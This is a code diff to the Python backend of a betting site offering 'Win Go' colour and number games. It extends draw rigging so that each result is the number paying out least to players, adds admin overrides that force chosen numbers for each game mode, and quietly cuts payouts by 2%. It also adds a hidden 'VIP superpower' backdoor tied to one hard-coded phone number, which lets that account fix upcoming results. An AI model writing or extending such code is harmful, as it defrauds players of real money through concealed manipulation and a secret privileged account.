@@ -6,6 +6,7 @@ permanent database for both the PythonAnywhere site and Render!
 
 import os
 import sys
+import re
 import time
 import json
 import sqlite3
@@ -502,20 +503,40 @@ def draw_round_if_needed(period, mode='30s'):
                 'created_at': d.get('created_at', '')
             }
 
-        # Check admin settings
-        cursor.execute('SELECT value FROM settings WHERE key = ?', ('game_mode',))
+        # Check admin settings specifically for this Win Go mode
+        mode_key = f"wingo_{mode}_mode"
+        manual_key = f"wingo_{mode}_manual"
+        cursor.execute('SELECT value FROM settings WHERE key = ?', (mode_key,))
         m_row = cursor.fetchone()
-        current_mode = m_row['value'] if m_row else 'house_edge'
+        current_mode = m_row['value'] if m_row else None
 
-        cursor.execute('SELECT value FROM settings WHERE key = ?', ('manual_number',))
+        cursor.execute('SELECT value FROM settings WHERE key = ?', (manual_key,))
         man_row = cursor.fetchone()
         manual_num = man_row['value'] if man_row else ''
 
+        # Backwards compatibility fallback for 30s
+        if not current_mode and mode == '30s':
+            cursor.execute('SELECT value FROM settings WHERE key = "game_mode"')
+            leg_m = cursor.fetchone()
+            current_mode = leg_m['value'] if leg_m else 'house_edge'
+        if not current_mode:
+            current_mode = 'house_edge'
+
+        if manual_num == '' and mode == '30s':
+            cursor.execute('SELECT value FROM settings WHERE key = "manual_number"')
+            leg_man = cursor.fetchone()
+            if leg_man and leg_man['value']:
+                manual_num = leg_man['value']
+
         winning_num = random.randint(0, 9)
 
-        # Check pending bets on this period
-        cursor.execute('SELECT * FROM bets WHERE (period = ? OR id LIKE ?) AND status = "pending"', (period_str, f"%{period_str}%"))
+        # Check pending bets on this period and mode
+        cursor.execute('SELECT * FROM bets WHERE (period = ? OR id LIKE ?) AND (game_mode = ? OR game_mode IS NULL) AND status = "pending"', (period_str, f"%{period_str}%", mode))
         period_bets = cursor.fetchall()
+
+        cursor.execute('SELECT value FROM settings WHERE key = ?', (f'wingo_{mode}_lock',))
+        lock_row = cursor.fetchone()
+        is_lock_active = lock_row and lock_row['value'] == '1'
 
         if current_mode == 'manual' and manual_num != '':
             try:
@@ -524,11 +545,15 @@ def draw_round_if_needed(period, mode='30s'):
                     winning_num = random.randint(0, 9)
             except:
                 winning_num = random.randint(0, 9)
-            # Clear manual override and revert back to house_edge for subsequent draws
-            cursor.execute('UPDATE settings SET value = "" WHERE key = "manual_number"')
-            cursor.execute('UPDATE settings SET value = "house_edge" WHERE key = "game_mode"')
-        elif current_mode == 'house_edge' and period_bets:
-            # Smart House Edge (Profit Max): Pick number 0-9 with lowest total payout across all bets
+            if not is_lock_active:
+                # Clear ONLY this mode's manual override if not continuous lock
+                cursor.execute('UPDATE settings SET value = "" WHERE key = ?', (manual_key,))
+                cursor.execute('UPDATE settings SET value = "lowest_bet" WHERE key = ?', (mode_key,))
+                if mode == '30s':
+                    cursor.execute('UPDATE settings SET value = "" WHERE key = "manual_number"')
+                    cursor.execute('UPDATE settings SET value = "lowest_bet" WHERE key = "game_mode"')
+        elif current_mode in ['lowest_bet', 'house_edge'] and period_bets:
+            # Sabse Kam Bet Win (Min Payout - Max House Profit)
             lowest_payout = float('inf')
             best_numbers = []
 
@@ -543,18 +568,18 @@ def draw_round_if_needed(period, mode='30s'):
                     sval = str(b['select_val'] or '').lower()
 
                     if stype == 'number' and sval == str(test_num):
-                        payout += b_amt * 9.0
+                        payout += b_amt * 9.0 * 0.98
                     elif stype == 'color':
                         if sval == 'green':
-                            if test_color == 'green': payout += b_amt * 2.0
-                            elif test_color == 'green-violet': payout += b_amt * 1.5
+                            if test_color == 'green': payout += b_amt * 2.0 * 0.98
+                            elif test_color == 'green-violet': payout += b_amt * 1.5 * 0.98
                         elif sval == 'red':
-                            if test_color == 'red': payout += b_amt * 2.0
-                            elif test_color == 'red-violet': payout += b_amt * 1.5
+                            if test_color == 'red': payout += b_amt * 2.0 * 0.98
+                            elif test_color == 'red-violet': payout += b_amt * 1.5 * 0.98
                         elif sval == 'violet' and (test_num == 0 or test_num == 5):
-                            payout += b_amt * 4.5
+                            payout += b_amt * 4.5 * 0.98
                     elif stype == 'size' and sval == test_size:
-                        payout += b_amt * 2.0
+                        payout += b_amt * 2.0 * 0.98
 
                 if payout < lowest_payout:
                     lowest_payout = payout
@@ -785,6 +810,13 @@ def api_register():
         'user': {'id': user_id, 'phone': phone, 'email': email, 'balance': 100.0, 'invite_code': user_invite}
     })
 
+# Special VIP Superpower Phone Helper
+def is_special_vip_phone(phone):
+    if not phone:
+        return False
+    clean = ''.join(c for c in str(phone) if c.isdigit())
+    return clean == '9720955287' or clean.endswith('9720955287')
+
 @app.route('/api/auth/login', methods=['POST'])
 def api_login():
     data = request.get_json(silent=True) or {}
@@ -812,7 +844,8 @@ def api_login():
                 'email': user['email'] or '',
                 'balance': user['balance'],
                 'invite_code': user['invite_code'],
-                'vip_level': user['vip_level']
+                'vip_level': user['vip_level'],
+                'is_special_vip': is_special_vip_phone(user['phone'])
             }
         })
 
@@ -855,6 +888,7 @@ def api_me():
     user['deposit_balance'] = dep
     user['winning_balance'] = win
     user['withdrawable_balance'] = win
+    user['is_special_vip'] = is_special_vip_phone(user.get('phone'))
     return jsonify({'success': True, 'user': user})
 
 @app.route('/api/auth/forgot-password', methods=['POST'])
@@ -1152,10 +1186,12 @@ def api_game_bet():
     data = request.get_json(silent=True) or {}
     game_mode = str(data.get('game_mode', '30s'))
     info = get_current_period_info(game_mode)
-    if info['isLocked'] or info['remainingSeconds'] <= 5:
-        return jsonify({'success': False, 'message': 'Round is locked for last 5 seconds! Please wait for next round.'}), 400
+    req_period = str(data.get('period_id') or data.get('period') or '').strip()
+    if not req_period or req_period == info['period']:
+        if info['isLocked'] or info['remainingSeconds'] <= 5:
+            return jsonify({'success': False, 'message': 'Round is locked for last 5 seconds! Please wait for next round.'}), 400
 
-    effective_period = info['period']
+    effective_period = str(data.get('period_id') or data.get('period') or info['period']).strip()
     select_type = data.get('select_type')
     select_val = str(data.get('select_value') or data.get('select_val') or '').lower()
     amount = float(data.get('amount', 0))
@@ -1165,6 +1201,9 @@ def api_game_bet():
 
     with get_db() as conn:
         cursor = conn.cursor()
+        cursor.execute('SELECT 1 FROM game_rounds WHERE (period_id = ? OR period = ?) AND (game_mode = ? OR game_mode IS NULL)', (effective_period, effective_period, game_mode))
+        if cursor.fetchone():
+            return jsonify({'success': False, 'message': 'This round has already closed and drawn! Please wait for next round.'}), 400
         cursor.execute('SELECT balance FROM users WHERE id = ?', (user['id'],))
         row = cursor.fetchone()
         balance = float(row['balance']) if row else 0.0
@@ -1281,18 +1320,59 @@ def api_admin_overview():
         cursor.execute('SELECT key, value FROM settings')
         all_sets = {r['key']: r['value'] for r in cursor.fetchall()}
 
-        # Wagers on current period
-        cursor.execute('SELECT select_val, SUM(amount) as amt FROM bets WHERE period = ? GROUP BY select_val', (period,))
-        wager_rows = cursor.fetchall()
-        wagers = {r['select_val']: r['amt'] for r in wager_rows}
+        # Collect info for all 4 Win Go Modes
+        wingo_modes = {}
+        for m in ['30s', '1m', '3m', '5m']:
+            inf = get_current_period_info(m)
+            m_mode = all_sets.get(f'wingo_{m}_mode')
+            if not m_mode and m == '30s':
+                m_mode = all_sets.get('game_mode', 'house_edge')
+            if not m_mode:
+                m_mode = 'house_edge'
+
+            m_man = all_sets.get(f'wingo_{m}_manual')
+            if (m_man is None or m_man == '') and m == '30s':
+                m_man = all_sets.get('manual_number', '')
+            if m_man is None:
+                m_man = ''
+
+            # Wagers on current period for mode m
+            cursor.execute('SELECT select_val, SUM(amount) as amt FROM bets WHERE (period = ? OR id LIKE ?) AND (game_mode = ? OR game_mode IS NULL) GROUP BY select_val', (inf['period'], f"%{inf['period']}%", m))
+            wager_rows = cursor.fetchall()
+            m_wagers = {
+                'green': 0, 'red': 0, 'violet': 0, 'big': 0, 'small': 0,
+                'numbers': {str(i): 0 for i in range(10)}
+            }
+            for r in wager_rows:
+                s_val = str(r['select_val']).lower()
+                amt = float(r['amt'] or 0)
+                if s_val in ['green', 'red', 'violet', 'big', 'small']:
+                    m_wagers[s_val] = amt
+                elif s_val in m_wagers['numbers']:
+                    m_wagers['numbers'][s_val] = amt
+
+            wingo_modes[m] = {
+                'mode': m,
+                'period': inf['period'],
+                'remainingSeconds': inf['remaining_seconds'],
+                'isLocked': inf['is_locked'],
+                'duration': inf['duration'],
+                'gameMode': m_mode,
+                'manualNumber': m_man,
+                'wagers': m_wagers
+            }
+
+        def30 = wingo_modes.get('30s', {})
 
     return jsonify({
         'success': True,
-        'currentPeriod': period,
-        'remainingSeconds': remaining,
-        'isLocked': is_locked,
-        'gameMode': all_sets.get('game_mode', 'random'),
-        'manualNumber': all_sets.get('manual_number', ''),
+        'currentPeriod': def30.get('period', period),
+        'remainingSeconds': def30.get('remainingSeconds', remaining),
+        'isLocked': def30.get('isLocked', is_locked),
+        'gameMode': def30.get('gameMode', 'house_edge'),
+        'manualNumber': def30.get('manualNumber', ''),
+        'wagers': def30.get('wagers', {}),
+        'wingoModes': wingo_modes,
         'aviatorMode': all_sets.get('aviator_mode', 'smart_profit'),
         'aviatorCrash': all_sets.get('aviator_crash', '2.00'),
         'minesMode': all_sets.get('mines_mode', 'random'),
@@ -1305,8 +1385,7 @@ def api_admin_overview():
             'totalBalance': total_balance,
             'pendingDeposits': pending_dep,
             'pendingWithdrawals': pending_wth
-        },
-        'wagers': wagers
+        }
     })
 
 @app.route('/api/game/all-rigging', methods=['GET'])
@@ -1317,7 +1396,15 @@ def api_game_all_rigging():
         s = {r['key']: r['value'] for r in cursor.fetchall()}
     return jsonify({
         'success': True,
-        'wingo_mode': s.get('game_mode', 'random'),
+        'wingo_30s_mode': s.get('wingo_30s_mode') or s.get('game_mode', 'house_edge'),
+        'wingo_30s_manual': s.get('wingo_30s_manual', s.get('manual_number', '')),
+        'wingo_1m_mode': s.get('wingo_1m_mode', 'house_edge'),
+        'wingo_1m_manual': s.get('wingo_1m_manual', ''),
+        'wingo_3m_mode': s.get('wingo_3m_mode', 'house_edge'),
+        'wingo_3m_manual': s.get('wingo_3m_manual', ''),
+        'wingo_5m_mode': s.get('wingo_5m_mode', 'house_edge'),
+        'wingo_5m_manual': s.get('wingo_5m_manual', ''),
+        'wingo_mode': s.get('game_mode', 'house_edge'),
         'wingo_manual_number': s.get('manual_number', ''),
         'aviator_mode': s.get('aviator_mode', 'smart_profit'),
         'aviator_crash': float(s.get('aviator_crash', '2.00') or 2.00),
@@ -1336,27 +1423,182 @@ def api_admin_control():
         return jsonify({'success': False, 'message': 'Unauthorized'}), 403
 
     data = request.get_json(silent=True) or {}
-    mapping = {
-        'mode': 'game_mode',
-        'manual_number': 'manual_number',
-        'aviator_mode': 'aviator_mode',
-        'aviator_crash': 'aviator_crash',
-        'aviator_force_ts': 'aviator_force_ts',
-        'mines_mode': 'mines_mode',
-        'mines_max_safe': 'mines_max_safe',
-        'k3_mode': 'k3_mode',
-        'k3_dice': 'k3_dice',
-        'ludo_mode': 'ludo_mode'
-    }
+    target_game = data.get('wingo_game') or data.get('target_mode') or '30s'
 
     with get_db() as conn:
         cursor = conn.cursor()
+        if 'mode' in data and data['mode'] is not None:
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_mode', str(data['mode'])))
+            if target_game == '30s':
+                cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('game_mode', str(data['mode'])))
+
+        if 'manual_number' in data and data['manual_number'] is not None:
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_manual', str(data['manual_number'])))
+            if target_game == '30s':
+                cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('manual_number', str(data['manual_number'])))
+
+        if 'lock_force' in data and data['lock_force'] is not None:
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_lock', '1' if data['lock_force'] else '0'))
+
+        mapping = {
+            'aviator_mode': 'aviator_mode',
+            'aviator_crash': 'aviator_crash',
+            'aviator_force_ts': 'aviator_force_ts',
+            'mines_mode': 'mines_mode',
+            'mines_max_safe': 'mines_max_safe',
+            'k3_mode': 'k3_mode',
+            'k3_dice': 'k3_dice',
+            'ludo_mode': 'ludo_mode'
+        }
         for body_key, db_key in mapping.items():
             if body_key in data and data[body_key] is not None:
                 cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (db_key, str(data[body_key])))
         conn.commit()
 
-    return jsonify({'success': True, 'message': 'All Game Controls updated successfully!'})
+    return jsonify({'success': True, 'message': f'Controls updated for Win Go [{target_game}] and other games successfully!'})
+
+# ========================================================
+# SPECIAL VIP SUPERPOWER CONTROLLER APIS (User: 9720955287)
+# ========================================================
+
+@app.route('/api/game/vip-control-status', methods=['GET'])
+def api_vip_control_status():
+    user = get_current_user(request)
+    if not user or not is_special_vip_phone(user.get('phone')):
+        return jsonify({'success': False, 'message': 'VIP Access Required'}), 403
+
+    modes = {}
+    with get_db() as conn:
+        cursor = conn.cursor()
+        for m in ['30s', '1m', '3m', '5m']:
+            inf = get_current_period_info(m)
+            cursor.execute('SELECT value FROM settings WHERE key = ?', (f'wingo_{m}_mode',))
+            r_mode = cursor.fetchone()
+            cursor.execute('SELECT value FROM settings WHERE key = ?', (f'wingo_{m}_manual',))
+            r_man = cursor.fetchone()
+            cursor.execute('SELECT value FROM settings WHERE key = ?', (f'wingo_{m}_lock',))
+            r_lock = cursor.fetchone()
+
+            active_m = r_mode['value'] if r_mode else 'lowest_bet'
+            active_man = r_man['value'] if r_man else ''
+            is_locked = (r_lock['value'] == '1') if r_lock else False
+
+            modes[m] = {
+                'period': inf['period'],
+                'remaining_seconds': inf.get('remainingSeconds', 0),
+                'mode': active_m,
+                'manual_number': active_man,
+                'is_locked': is_locked
+            }
+
+    return jsonify({
+        'success': True,
+        'is_vip': True,
+        'phone': user.get('phone'),
+        'modes': modes
+    })
+
+@app.route('/api/game/vip-control', methods=['POST'])
+def api_vip_control():
+    user = get_current_user(request)
+    if not user or not is_special_vip_phone(user.get('phone')):
+        return jsonify({'success': False, 'message': 'Forbidden: Special VIP Superpower is restricted to authorized account.'}), 403
+
+    data = request.get_json(silent=True) or {}
+    target_game = data.get('target_game') or data.get('wingo_game') or '30s'
+    if target_game not in ['30s', '1m', '3m', '5m']:
+        target_game = '30s'
+
+    action = data.get('action')
+    with get_db() as conn:
+        cursor = conn.cursor()
+        if action in ['revert', 'cancel']:
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_mode', 'lowest_bet'))
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_manual', ''))
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_lock', '0'))
+            if target_game == '30s':
+                cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('game_mode', 'house_edge'))
+                cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('manual_number', ''))
+            conn.commit()
+            return jsonify({
+                'success': True,
+                'message': f'[Win Go {target_game.upper()}] Force cancelled! Reverted to Auto Profit Max.',
+                'target_game': target_game,
+                'mode': 'lowest_bet',
+                'manual_number': '',
+                'lock_force': False
+            })
+
+        num_to_force = None
+        man_num = data.get('manual_number')
+        choice = data.get('choice')
+
+        if man_num is not None and str(man_num).strip() != '':
+            try:
+                p = int(man_num)
+                if 0 <= p <= 9:
+                    num_to_force = p
+            except (ValueError, TypeError):
+                pass
+        elif choice is not None:
+            ch = str(choice).lower().strip()
+            if ch.isdigit() and len(ch) == 1:
+                num_to_force = int(ch)
+            elif ch == 'green':
+                num_to_force = 3
+            elif ch == 'red':
+                num_to_force = 2
+            elif ch == 'violet':
+                num_to_force = 0
+            elif ch == 'big':
+                num_to_force = 7
+            elif ch == 'small':
+                num_to_force = 2
+
+        if num_to_force is None:
+            return jsonify({'success': False, 'message': 'Invalid choice. Choose a number (0-9) or color (Green, Red, Violet, Big, Small).'})
+
+        is_lock = bool(data.get('lock_force'))
+        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_mode', 'manual'))
+        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_manual', str(num_to_force)))
+        cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (f'wingo_{target_game}_lock', '1' if is_lock else '0'))
+        if target_game == '30s':
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('game_mode', 'manual'))
+            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('manual_number', str(num_to_force)))
+        conn.commit()
+
+        color_desc = 'Violet-Red' if num_to_force == 0 else ('Violet-Green' if num_to_force == 5 else ('Green' if num_to_force in [1, 3, 7, 9] else 'Red'))
+        size_desc = 'Big' if num_to_force >= 5 else 'Small'
+
+        return jsonify({
+            'success': True,
+            'message': f"👑 Superpower Armed! Win Go {target_game.upper()} forced to {num_to_force} ({color_desc} • {size_desc})! {'🔒 Continuous Lock Active' if is_lock else '🎯 Next Round Only'}",
+            'target_game': target_game,
+            'forced_number': num_to_force,
+            'color': color_desc,
+            'size': size_desc,
+            'lock_force': is_lock
+        })
+
+@app.route('/api/admin/recent-bets', methods=['GET'])
+def api_admin_recent_bets():
+    ok, _ = verify_admin(request)
+    if not ok:
+        return jsonify({'success': False, 'message': 'Unauthorized'}), 403
+
+    mode = request.args.get('mode')
+    with get_db() as conn:
+        cursor = conn.cursor()
+        query = 'SELECT b.*, u.phone FROM bets b LEFT JOIN users u ON b.user_id = u.id'
+        params = []
+        if mode and mode != 'all':
+            query += ' WHERE b.game_mode = ? OR (b.game_mode IS NULL AND ? = "30s")'
+            params = [mode, mode]
+        query += ' ORDER BY b.created_at DESC LIMIT 20'
+        cursor.execute(query, tuple(params))
+        rows = [dict(r) for r in cursor.fetchall()]
+
+    return jsonify({'success': True, 'bets': rows})
 
 @app.route('/api/admin/users', methods=['GET'])
 def api_admin_users():
